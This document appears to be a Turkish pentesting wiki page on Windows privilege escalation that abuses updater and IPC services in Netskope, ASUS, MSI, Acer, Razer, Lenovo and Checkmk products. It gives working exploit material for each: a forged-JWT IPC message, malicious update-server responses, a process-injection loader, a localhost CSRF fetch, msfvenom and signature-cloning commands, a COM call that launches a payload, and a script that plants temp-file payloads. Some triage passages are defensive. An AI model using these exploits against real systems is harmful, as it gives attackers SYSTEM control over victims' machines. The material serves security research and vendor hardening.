# Kurumsal Auto-Updater’ları ve Privileged IPC’yi Kötüye Kullanma (örn. Netskope, ASUS ve MSI)

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, düşük engelli bir IPC yüzeyi ve privileged bir güncelleme akışı sunan kurumsal endpoint agent’larında ve updater’larda bulunan bir Windows local privilege escalation zinciri sınıfını genelleştirir. Temsilî bir örnek, düşük ayrıcalıklı bir kullanıcının kayıt işlemini saldırganın kontrolündeki bir sunucuya yönlendirip ardından SYSTEM servisinin kurduğu kötü amaçlı bir MSI gönderebildiği, Netskope Client for Windows < R129’dur (CVE-2025-0309).<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Benzer ürünlerde yeniden kullanabileceğiniz temel fikirler:
- Yeniden kayıt veya yeniden yapılandırmayı saldırganın sunucusuna yönlendirmek için privileged bir servisin localhost IPC’sini kötüye kullanın.
- Üreticinin update endpoint’lerini uygulayın, sahte bir Trusted Root CA gönderin ve updater’ı kötü amaçlı, “imzalı” bir pakete yönlendirin.
- Zayıf signer kontrollerini (CN allow-list’leri), isteğe bağlı digest flag’lerini ve gevşek MSI özelliklerini atlatın.
- IPC “şifrelenmişse”, registry’de depolanan ve herkesin okuyabildiği makine tanımlayıcılarından key/IV türetin.
- Servis çağıranları image path/process name’e göre kısıtlıyorsa allow-list’teki bir sürece inject edin veya süreci suspended olarak başlatıp DLL’nizi asgari bir thread-context yamasıyla yükleyin.

Özel yerel TCP servisleri, bir PIN veya başka bir uygulama kimlik bilgisi gerektirseler bile aynı kimlik ve girdi sınırı incelemesine tabi tutulmalıdır. Listener’ı sürecine ve etkin service account’una eşleyin; ardından dağıtılmış tam binary/version’ı ve çağıran tarafından denetlenen alanların sabit boyutlu buffer’lara kopyalanmadan veya child-process komutu oluşturmak için kullanılmadan önce uzunluklarının denetlenip denetlenmediğini inceleyin. [Microsoft'un buffer taşmasıyla ilgili rehberi](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns), privileged native code’da denetlenmeyen harici girdilerin neden tehlikeli olduğunu açıklar. Bir loopback listener, hardcoded credential veya tek başına process name; memory corruption ya da SYSTEM execution olduğunu kanıtlamaz. Erişilebilirlik, yetkilendirme, code path ve mitigations ayrı koşullardır. Canlı bir servise crash uzunluğunda girdiler göndermek yerine rutin enumeration işlemlerini pasif tutun.

---
## 1) localhost IPC üzerinden kaydı saldırganın sunucusuna yönlendirme

Birçok agent, localhost TCP üzerinden JSON kullanarak SYSTEM servisiyle iletişim kuran bir user-mode UI süreci içerir.

Netskope’ta gözlemlenenler:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit akışı:
1) Backend host’u (örn. AddonUrl) belirleyen claim’lere sahip bir JWT enrollment token oluşturun. İmza gerekmemesi için alg=None kullanın.
2) Provisioning komutunu JWT’niz ve tenant adıyla çağıran IPC mesajını gönderin:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Servis kayıt/yapılandırma için sahte sunucunuza istek göndermeye başlar, ör.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notlar:
- Çağıran doğrulaması yol/ad tabanlıysa isteği izin verilen bir vendor binary'sinden başlatın (bkz. §4).<sup>[[1]](#references)[[2]](#references)</sup>

### Ağ üzerinden erişilebilen yönetim IPC'si

Bu güven sınırı her zaman localhost ile sınırlı değildir. Bildirilen MyReport Updater 2.1.1 vakasında, `LocalSystem` servisi tüm arayüzleri dinliyor ve referans host, port ve çalışma modu için kimlik doğrulaması gerektirmeyen bir gRPC yapılandırma değişikliğini kabul ediyordu. Uzaktan erişim varyantı için hem dinleyiciye ağ erişimi hem de servisten seçilen referansa giden bağlantı gerekiyordu. Bunları, sonraki paket akışının dosya yazma sınırını aşıp aşamayacağından ayrı değerlendirin.<sup>[[16]](#references)</sup>

---
## 2) SYSTEM olarak kod çalıştırmak için güncelleme kanalını ele geçirmek

İstemci sunucunuzla iletişim kurmaya başladıktan sonra beklenen endpoint'leri uygulayın ve onu saldırganın MSI dosyasına yönlendirin. Tipik sıra:

1) /v2/config/org/clientconfig → Çok kısa bir updater aralığı içeren JSON yapılandırması döndürün, ör.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Bir PEM CA certificate döndürür. Servis bunu Local Machine Trusted Root store’a yükler.
3) /v2/checkupdate → Kötü amaçlı bir MSI’ye ve sahte bir sürüme işaret eden metadata sağlayın.

Gerçek dünyada sık görülen kontrolleri atlatma:
- Signer CN allow-list: servis yalnızca Subject CN değerinin “netSkope Inc” veya “Netskope, Inc.” olup olmadığını kontrol edebilir. Rogue CA’niz bu CN değerine sahip bir leaf sertifikası oluşturup MSI’yi imzalayabilir.
- CERT_DIGEST property: CERT_DIGEST adında zararsız bir MSI property ekleyin. Yükleme sırasında doğrulama yapılmaz.
- İsteğe bağlı digest doğrulaması: yapılandırma bayrağı (ör. check_msi_digest=false) ek kriptografik doğrulamayı devre dışı bırakır.

Sonuç: SYSTEM servisi MSI’nizi
C:\ProgramData\Netskope\stAgent\data\*.msi
konumundan yükleyerek NT AUTHORITY\SYSTEM olarak rastgele kod çalıştırır.<sup>[[1]](#references)[[2]](#references)</sup>

Yama atlatma dersi: Bir vendor, güncelleme kaynağını kriptografik olarak doğrulamak yerine küçük bir “güvenilir” domain kümesini allow-list’e ekleyerek yanıt verirse trafiği yönlendirmenize hâlâ izin veren vendor’a ait redirector’ları veya reverse proxy’leri arayın. Netskope örneğinde, kamuya açık takip araştırmaları R129 dönemi allow-list’inin, saldırganın kontrolündeki Azure App Service içeriğini proxy’leyen `rproxy.goskope.com` üzerinden hâlâ suistimal edilebildiğini gösterdi. Hostname allow-list’lerini güven sınırı değil, aşılması gereken bir engel olarak görün.<sup>[[14]](#references)</sup>

Bir başka hata biçimi de **kendi içinde tutarlı ancak kimliği doğrulanmamış paket metadata’sıdır**. MyReport örneğinde, saldırganın kontrolündeki bir referans değiştirilmiş bir arşiv sunarken aradaki bir sistem, vendor’ın MD5 digest ve boyut yanıtlarını updater’a ulaşmadan önce değiştirdi. Bu değerlerin eşleşmesi vendor kaynağını değil, yanıtların tutarlılığını doğruluyordu; MD5 collision gerekmiyordu. Çağıranın seçtiği bir kurulum dizini de ayrıcalıklı çıkarma işlemini bir file-write sınırına dönüştürdü. Bunun sonucunda oluşan DLL-loading primitive’i, [arbitrary file write işlemini DLL hijacking’e dönüştürme](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack) başlığı altında ele alınmıştır.<sup>[[16]](#references)</sup>

---
## 3) Şifrelenmiş IPC isteklerini taklit etme (mevcutsa)

R127’den itibaren Netskope, IPC JSON verisini Base64’e benzeyen bir encryptData alanıyla sarmaladı. Tersine mühendislik, AES kullanıldığını ve key/IV değerlerinin herhangi bir kullanıcının okuyabildiği registry değerlerinden türetildiğini gösterdi:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Saldırganlar şifrelemeyi yeniden uygulayıp standart bir kullanıcı hesabından geçerli, şifrelenmiş komutlar gönderebilir.<sup>[[1]](#references)[[2]](#references)</sup> Genel ipucu: Bir agent aniden IPC’yi “şifrelemeye” başlarsa HKLM altında materyal olarak kullanılan device ID, product GUID ve install ID değerlerini arayın.

---
## 4) IPC çağıranı allow-list’lerini atlatma (path/name kontrolleri)

Bazı servisler, TCP bağlantısının PID değerini bulup image path/name değerini Program Files altında bulunan allow-list’e alınmış vendor binary’leriyle (ör. stagentui.exe, bwansvc.exe, epdlp.exe) karşılaştırarak diğer ucu doğrulamaya çalışır.

İki pratik atlatma yöntemi:
- Allow-list’e alınmış bir process’e (ör. nsdiag.exe) DLL injection yapıp IPC’yi process’in içinden proxy’lemek.
- Driver tarafından uygulanan tamper kurallarını karşılamak için allow-list’e alınmış bir binary’yi suspended durumda başlatıp CreateRemoteThread kullanmadan proxy DLL’nizi başlatmak (§5’e bakın).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper protection ile uyumlu injection: suspended process + NtContinue patch

Ürünler, korunan process’lere ait handle’lardan tehlikeli hakları çıkarmak için genellikle bir minifilter/OB callbacks driver (ör. Stadrv) içerir:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME haklarını kaldırır
- Thread: hakları THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE ile sınırlar

Bu kısıtlamalara uyan güvenilir bir user-mode loader:
1) Bir vendor binary’si için CREATE_SUSPENDED ile CreateProcess çağrısı yapın.
2) Hâlâ almanıza izin verilen handle’ları edinin: process üzerinde PROCESS_VM_WRITE | PROCESS_VM_OPERATION ve THREAD_GET_CONTEXT/THREAD_SET_CONTEXT haklarına sahip bir thread handle’ı (veya kodu bilinen bir RIP konumunda patch’liyorsanız yalnızca THREAD_RESUME).
3) ntdll!NtContinue (veya erken yüklenen ve belleğe eşlendiği garanti olan başka bir thunk) üzerine, DLL path’inizle LoadLibraryW çağıran ve ardından geri dönen küçük bir stub yazın.
4) Stub’ı process içinde çalıştırıp DLL’nizi yüklemek için ResumeThread çağrısı yapın.

Önceden korunan bir process üzerinde PROCESS_CREATE_THREAD veya PROCESS_SUSPEND_RESUME kullanmadığınızdan (process’i siz oluşturduğunuzdan), driver’ın politikası karşılanır.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Pratik araçlar
- NachoVPN (Netskope plugin), rogue CA oluşturma, kötü amaçlı MSI imzalama ve gerekli endpoint’leri sunma işlemlerini otomatikleştirir: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope, rastgele (isteğe bağlı olarak AES ile şifrelenmiş) IPC mesajları oluşturan özel bir IPC client’tır ve allow-list’e alınmış bir binary’den istek göndermek için suspended-process injection içerir.<sup>[[4]](#references)</sup>

## 7) Bilinmeyen updater/IPC yüzeyleri için hızlı triage iş akışı

Yeni bir endpoint agent veya motherboard “helper” suite ile karşılaştığınızda, umut vadeden bir privesc hedefiyle karşı karşıya olup olmadığınızı anlamak için genellikle hızlı bir iş akışı yeterlidir:<sup>[[6]](#references)</sup>

1) Loopback listener’larını listeleyin ve bunları vendor process’leriyle eşleştirin:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Aday named pipe'ları listeleyin:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Eklenti tabanlı IPC sunucularının kullandığı kayıt defteri destekli yönlendirme verilerini çıkarın:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Önce user-mode client'tan endpoint adlarını, JSON key'lerini ve command ID'lerini çıkarın. Paketlenmiş Electron/.NET frontend'ler sıklıkla tam şemayı leak eder:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Sonunda süreci başlatan kod yolunu değil, gerçek güven koşulunu araştırın:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Öncelik vermeye değer kalıplar:
- `CryptQueryObject`/sertifika ayrıştırma işlemlerinde genellikle `WinVerifyTrust` kullanılmıyorsa, “sertifika mevcut” ifadesi “sertifika güvenilir” olarak değerlendirilmiş olabilir; bu da sertifika klonlamayı veya sahte imzalayıcıya yönelik başka yöntemleri mümkün kılar.
- `Origin`, `Referer`, indirme URL'leri, işlem adları veya imzalayan CN'leri üzerinde yapılan alt dize/son ek kontrolleri kimlik doğrulama değildir. `contains(".vendor.com")` denetimi, saldırganın kontrolündeki benzer görünümlü alan adlarıyla genellikle istismar edilebilir.
- Düşük ayrıcalıklı GUI “dosya güvenilir” kararını veriyor ve SYSTEM broker yalnızca bu sonucu kullanıyorsa, istemci tarafındaki DLL/JS'yi yamamak veya yeniden uygulamak sınırı tamamen aşabilir (Razer tarzı bölünmüş doğrulama).
- Broker bir payload'ı `%TEMP%`/`C:\Windows\Temp` konumuna kopyalayıp ardından bu konumdan doğruluyor veya zamanlıyorsa, TOCTOU değiştirme pencerelerini ve daha zayıf denetimlere sahip alternatif `ExecuteTask()` sarmalayıcıları sunan kardeş plugin modüllerini hemen test edin.<sup>[[6]](#references)</sup>

Named pipe kullanımının yoğun olduğu hedeflerde, protokolü ayrıntılı biçimde tersine mühendisliğe tabi tutmaya başlamadan önce zayıf DACL'leri ve uzaktan erişilebilen pipe'ları belirlemek için PipeViewer hızlı bir yöntemdir.<sup>[[11]](#references)</sup>

Hedef çağıranları yalnızca PID, imaj yolu veya işlem adıyla doğruluyorsa, bunu bir güvenlik sınırı değil, aşılması gereken bir engel olarak değerlendirin: meşru istemciye kod enjekte etmek veya izin verilenler listesindeki bir işlemden bağlantı kurmak, sunucunun denetimlerini geçmek için çoğu zaman yeterlidir. Named pipe'lar özelinde, [istemci taklidi ve pipe abuse hakkındaki bu sayfa](named-pipe-client-impersonation.md) temel yöntemi daha ayrıntılı ele alıyor.

Ayrıcalıklı bir **cleanup veya restore broker** için, pipe ACL'sinin yanı sıra yol güven sınırını da inceleyin. Hizmet çalıştırılabilir dosyası ve kurulum dizini korumalı olsa bile, düşük ayrıcalıklı bir çağıran paylaşılan bir dizindeki geri yükleme hedefini seçebilir veya hazırlanan yedekleme öğesini yeniden adlandırabilir. Çağıranın restore komutuna erişebildiğini, hazırlanan tam girdiyi veya dosya adını değiştirebildiğini, broker'ın daha yüksek ayrıcalıkla çalıştığını ve restore işleminin gerçekten seçilen korumalı yola yazdığını ayrı ayrı doğrulayın. Yazılabilir bir hazırlama dizini veya okunabilir bir pipe tek başına keyfi ayrıcalıklı yazma imkânını kanıtlamaz; hedef eşlemesi ve hizmet davranışı kod incelemesiyle veya kontrollü testlerle doğrulanmalıdır. Pasif keşif sırasında bilinmeyen bir cleanup komutunu çalıştırmayın; kullanıcı dosyalarını silebilir.

---
## 8) Yalnızca vendor imzalarıyla kimlik doğrulayan modüler add-in broker'ları (Lenovo Vantage kalıbı)

Araştırmaya değer yeni bir varyasyon **signed-client RPC broker** modelidir: düşük ayrıcalıklı, Lenovo imzalı bir masaüstü işlemi SYSTEM hizmetiyle iletişim kurar ve hizmet, JSON komutlarını `%ProgramData%` altındaki XML ile tanımlanmış bir dizi add-in'e yönlendirir. Kabul edilen herhangi bir imzalı istemcinin **içinde kod yürütme** elde edildiğinde, her `runas="system"` sözleşmesi saldırı yüzeyinizin bir parçası olur.<sup>[[15]](#references)</sup>

Lenovo Vantage araştırmalarında gözlemlenen yüksek değerli temel yöntemler:
- **Çağırana vendor imzası taşıdığı için güvenmek**: Araştırmacılar, Lenovo imzalı bir EXE'yi yazılabilir bir dizine kopyalayıp DLL side-load'u (`profapi.dll`) gerçekleştirerek kimliği doğrulanmış bir bağlama ulaştı; böylece hizmetin zaten güvendiği bir istemcinin içinde keyfi kod çalıştırdılar.
- **Manifest odaklı saldırı yüzeyi keşfi**: Add-in'ler `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` altında tanımlanır; bazı sözleşmeler `SYSTEM` olarak çalışır. Bu nedenle manifestleri listelemek, broker'ın kendisini tersine mühendisliğe tabi tutmaktan daha hızlı biçimde gerçek ayrıcalıklı eylemleri ortaya çıkarabilir.
- **Kimliği doğrulanmış kanalın arkasındaki komut başına hatalar**: Güvenilen istemcinin içine girdikten sonra, kamuya açık araştırmalarda update/install eylemlerinde path traversal + race condition'lar, ayrıcalıklı ayar veritabanlarında raw SQL abuse ve amaçlanan hive dışına yazmaya olanak veren alt dize tabanlı registry path denetimleri bulundu.

Bir hedefte yararlı keşif:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Pratik çıkarım: Bir yardımcı araç paketi, önce **çağıran süreci** doğrulayan ve ancak bundan sonra onlarca plugin/add-in komutuna yönlendirme yapan bir broker sunuyorsa, ön kapıdaki güvenlik kontrolünü atlatınca durmayın. Manifest/contract tablosunu dökün ve yüksek ayrıcalıklı her fiili bağımsız olarak fuzz edin; kimliği doğrulanmış kanal genellikle ikinci aşamada ortaya çıkan birkaç hatayı gizler.

---
## 1) Ayrıcalıklı HTTP API'lerine karşı tarayıcıdan localhost'a CSRF (ASUS DriverHub)

DriverHub, 127.0.0.1:53000 üzerinde çalışan ve https://driverhub.asus.com adresinden gelen tarayıcı çağrılarını bekleyen bir kullanıcı modu HTTP hizmeti (ADU.exe) sunar. Origin filtresi, Origin başlığında ve `/asus/v1.0/*` üzerinden sunulan indirme URL'lerinde yalnızca `string_contains(".asus.com")` çağrısını yapar. Bu nedenle `https://driverhub.asus.com.attacker.tld` gibi saldırganın kontrolündeki herhangi bir host kontrolü geçer ve JavaScript üzerinden durum değiştiren istekler gönderebilir.<sup>[[6]](#references)</sup> Ek atlatma kalıpları için [CSRF temelleri](../../pentesting-web/csrf-cross-site-request-forgery.md) sayfasına bakın.

Pratik akış:
1) `.asus.com` içeren bir domain kaydedin ve burada kötü amaçlı bir web sayfası barındırın.
2) `http://127.0.0.1:53000` üzerindeki ayrıcalıklı bir endpoint'i (ör. `Reboot`, `UpdateApp`) çağırmak için `fetch` veya XHR kullanın.
3) Handler'ın beklediği JSON gövdesini gönderin – paketlenmiş frontend JS aşağıdaki şemayı gösterir.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Aşağıda gösterilen PowerShell CLI bile, Origin header güvenilir değer olarak spoof edildiğinde başarılı olur:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Saldırgan sitesine yapılan her tarayıcı ziyareti, böylece SYSTEM yetkili bir yardımcıyı çalıştıran 1 tıklamalı (veya `onload` aracılığıyla 0 tıklamalı) bir yerel CSRF'ye dönüşür.

---
## 2) Güvensiz code-signing doğrulaması ve sertifika klonlama (ASUS UpdateApp)

`/asus/v1.0/UpdateApp`, JSON gövdesinde tanımlanan rastgele yürütülebilir dosyaları indirir ve `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` konumunda önbelleğe alır. İndirme URL'si doğrulaması aynı alt dize mantığını yeniden kullanır; bu nedenle `http://updates.asus.com.attacker.tld:8000/payload.exe` kabul edilir. İndirmeden sonra ADU.exe, çalıştırmadan önce yalnızca PE'nin bir imza içerip içermediğini ve Subject dizgesinin ASUS ile eşleşip eşleşmediğini kontrol eder; `WinVerifyTrust` veya zincir doğrulaması yapmaz.

Bu akışı silahlandırmak için:
1) Bir payload oluşturun (örn. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS imzalayanını payload'a klonlayın (örn. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe` dosyasını `.asus.com` benzeri bir etki alanında barındırın ve yukarıdaki tarayıcı CSRF'si aracılığıyla UpdateApp'i tetikleyin.

Hem Origin hem de URL filtreleri alt dize tabanlı, imzalayan kontrolü de yalnızca dizeleri karşılaştırıyor olduğundan DriverHub, saldırganın ikili dosyasını yükseltilmiş bağlamda indirip çalıştırır.<sup>[[6]](#references)</sup>

---
## 1) Updater'ın kopyalama/çalıştırma yollarında TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center'ın SYSTEM hizmeti, her çerçevenin `4-byte ComponentID || 8-byte CommandID || ASCII arguments` biçiminde olduğu bir TCP protokolü sunar. Çekirdek bileşen (Component ID `0f 27 00 00`), `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` sağlar. İşleyicisi:
1) Verilen yürütülebilir dosyayı `C:\Windows\Temp\MSI Center SDK.exe` konumuna kopyalar.
2) `CS_CommonAPI.EX_CA::Verify` aracılığıyla imzayı doğrular (sertifika subject'i “MICRO-STAR INTERNATIONAL CO., LTD.” ile eşleşmeli ve `WinVerifyTrust` başarılı olmalıdır).
3) Geçici dosyayı saldırgan denetimindeki argümanlarla SYSTEM olarak çalıştıran zamanlanmış bir görev oluşturur.

Kopyalanan dosya, doğrulama ile `ExecuteTask()` çağrısı arasında kilitlenmez. Saldırgan şunları yapabilir:
- İmza kontrolünün geçmesini ve görevin kuyruğa alınmasını garanti etmek için meşru, MSI imzalı bir ikili dosyaya işaret eden Frame A gönderir.
- Doğrulama tamamlandıktan hemen sonra `MSI Center SDK.exe` dosyasının üzerine yazan kötü amaçlı bir payload'a işaret eden tekrarlı Frame B mesajlarıyla yarışır.

Zamanlayıcı devreye girdiğinde, özgün dosya doğrulanmış olmasına rağmen üzerine yazılan payload'ı SYSTEM yetkisiyle çalıştırır. Güvenilir bir istismar için, TOCTOU aralığı kazanılana kadar CMD_AutoUpdateSDK'yi spam'leyen iki goroutine/thread kullanılır.<sup>[[6]](#references)</sup>

---
## 2) Özel SYSTEM düzeyindeki IPC ve impersonation'ı kötüye kullanma (MSI Center + Acer Control Centre)

### MSI Center TCP komut kümeleri
- `MSI.CentralServer.exe` tarafından yüklenen her plugin/DLL, `HKLM\SOFTWARE\MSI\MSI_CentralServer` altında saklanan bir Component ID alır. Bir çerçevenin ilk 4 baytı bu bileşeni seçer; böylece saldırganlar komutları rastgele modüllere yönlendirebilir.
- Plugin'ler kendi görev çalıştırıcılarını tanımlayabilir. `Support\API_Support.dll`, `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` komutunu sunar ve **imza doğrulaması yapmadan** doğrudan `API_Support.EX_Task::ExecuteTask()` çağrısı yapar; herhangi bir yerel kullanıcı bunu `C:\Users\<user>\Desktop\payload.exe` dosyasını çalıştıracak şekilde ayarlayıp güvenilir biçimde SYSTEM yetkisi elde edebilir.
- Wireshark ile loopback trafiğini dinlemek veya dnSpy'da .NET ikili dosyalarını incelemek, Component ↔ command eşlemesini hızla ortaya çıkarır; ardından özel Go/Python istemcileri çerçeveleri yeniden oynatabilir.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipe'ları ve impersonation düzeyleri
- `ACCSvc.exe` (SYSTEM), `\\.\pipe\treadstone_service_LightMode` adlı named pipe'ı sunar ve bu pipe'ın discretionary ACL'si uzak istemcilere de izin verir (örn. `\\TARGET\pipe\treadstone_service_LightMode`). Dosya yolu ile birlikte command ID `7` gönderildiğinde hizmetin süreç başlatma yordamı çağrılır.
- İstemci kitaplığı, argümanlarla birlikte sihirli bir sonlandırıcı bayt (113) serileştirir. Frida/`TsDotNetLib` ile yapılan dinamik enstrümantasyon ([Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) bölümüne bakın), yerel işleyicinin `CreateProcessAsUser` çağrısından önce bu değeri `SECURITY_IMPERSONATION_LEVEL` ve bütünlük SID'sine eşlediğini gösterir.
- 113 (`0x71`) yerine 114 (`0x72`) kullanılması, tam SYSTEM token'ını koruyan ve yüksek bütünlük SID'si (`S-1-16-12288`) ayarlayan genel dala geçiş yapar. Böylece başlatılan ikili dosya hem yerel hem de makineler arası senaryolarda kısıtlamasız SYSTEM olarak çalışır.
- Bunu, ACC'yi laboratuvar VM'lerinde bile kurup üretici donanımı olmadan pipe'ı denemeyi sağlayan açık yükleyici bayrağıyla (`Setup.exe -nocheck`) birleştirin.<sup>[[6]](#references)</sup>

Bu IPC açıkları, localhost hizmetlerinin neden karşılıklı kimlik doğrulaması (ALPC SID'leri, `ImpersonationLevel=Impersonation` filtreleri, token filtreleme) uygulaması gerektiğini ve her modülün “rastgele ikili dosya çalıştırma” yardımcısının aynı imzalayan doğrulamalarını paylaşmasının neden önemli olduğunu gösterir.

---
## 3) Zayıf user-mode doğrulamasına dayanan COM/IPC “elevator” yardımcıları (Razer Synapse 4)

Razer Synapse 4, bu aileye başka bir kullanışlı örüntü daha ekledi: düşük yetkili bir kullanıcı, `RzUtility.Elevator` aracılığıyla COM yardımcısından bir süreç başlatmasını isteyebilir; güven kararı ise ayrıcalıklı sınır içinde sağlam biçimde uygulanmak yerine user-mode DLL (`simple_service.dll`) tarafından verilir.

Gözlemlenen istismar yolu:
- `RzUtility.Elevator` COM nesnesini örneklendirin.
- Yükseltilmiş başlatma isteğinde bulunmak için `LaunchProcessNoWait(<path>, "", 1)` çağrısını yapın.
- Herkese açık PoC'de, isteği göndermeden önce `simple_service.dll` içindeki PE-imza kontrolü devre dışı bırakılır; böylece saldırganın seçtiği rastgele bir yürütülebilir dosya başlatılabilir.<sup>[[6]](#references)[[10]](#references)</sup>

En kısa PowerShell çağrısı:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Genel çıkarım: “helper” paketlerini tersine mühendislikle incelerken yalnızca localhost TCP veya named pipe’ları kontrol etmekle yetinmeyin. `Elevator`, `Launcher`, `Updater` veya `Utility` gibi adlara sahip COM sınıflarını arayın; ardından ayrıcalıklı hizmetin hedef binary’yi gerçekten doğrulayıp doğrulamadığını, yoksa yalnızca yamalanabilir bir user-mode client DLL tarafından hesaplanan sonuca mı güvendiğini kontrol edin. Bu model Razer dışındaki ürünler için de geçerlidir: yüksek ayrıcalıklı broker’ın düşük ayrıcalıklı taraftan gelen bir izin/verme kararını kullandığı her bölünmüş tasarım, olası bir privesc saldırı yüzeyidir.


---
## MSI repair sırasında tahmin edilebilir geçici script çalıştırılması (Checkmk Agent / CVE-2024-0670)

Bazı Windows agent’ları hâlâ ayrıcalıklı işlemleri `C:\Windows\Temp` içine geçici bir `.cmd` yazarak ve bunu `SYSTEM` olarak çalıştırarak gerçekleştiriyor. Dosya adı tahmin edilebiliyorsa ve hizmet mevcut dosyaları güvenli biçimde yeniden oluşturmuyorsa, düşük ayrıcalıklı bir kullanıcı ileride kullanılacak geçici dosyayı önceden **salt okunur** olarak oluşturup ayrıcalıklı sürecin kendi script’i yerine saldırganın denetimindeki içeriği çalıştırmasını sağlayabilir.

Güvenlik açığı bulunan Checkmk Agent sürümlerinde gözlemlenenler:
- geçici dosya kalıbı: `cmk_all_<PID>_1.cmd`
- etkilenen dallar: `2.0.0`, `2.1.0`, `2.2.0`
- tetikleyici: önbelleğe alınmış agent paketinin MSI **repair** işlemi<sup>[[8]](#references)[[9]](#references)</sup>

Uygulama adımları:
1. Mevcut process ID’lerinden veya çalışan agent PID’sinden gerçekçi bir PID aralığı tahmin edin.
2. Kısa bir **ASCII** `.cmd` payload’ı yazın (`Set-Content -Encoding Ascii` veya `cmd.exe` yönlendirmesi kullanın; batch dosyaları için UTF-16 PowerShell çıktısından kaçının).
3. Aday aralıktaki `C:\Windows\Temp\cmk_all_<PID>_1.cmd` dosyalarını topluca oluşturun ve her birini salt okunur olarak işaretleyin.
4. Ayrıcalıklı hizmetin geçici script’i yeniden oluşturmaya çalışıp ardından çalıştırması için önbelleğe alınmış MSI paketinin repair işlemini tetikleyin.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Savunmasız ürün Windows Installer ile yüklenmişse, onarımı başlatmadan önce `C:\Windows\Installer` altındaki rastgele görünen önbelleğe alınmış MSI dosyasını ürün adıyla eşleştirin:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operasyonel notlar:
- `qwinsta`, etkileşimsiz bir WinRM shell'inden `msiexec /fa` başarısız olduğunda ve mevcut bir masaüstü/bağlantısı kesilmiş oturumun onarımı doğru şekilde tetikleyip tetikleyemeyeceğini anlamanız gerektiğinde kullanışlıdır.<sup>[[7]](#references)</sup>
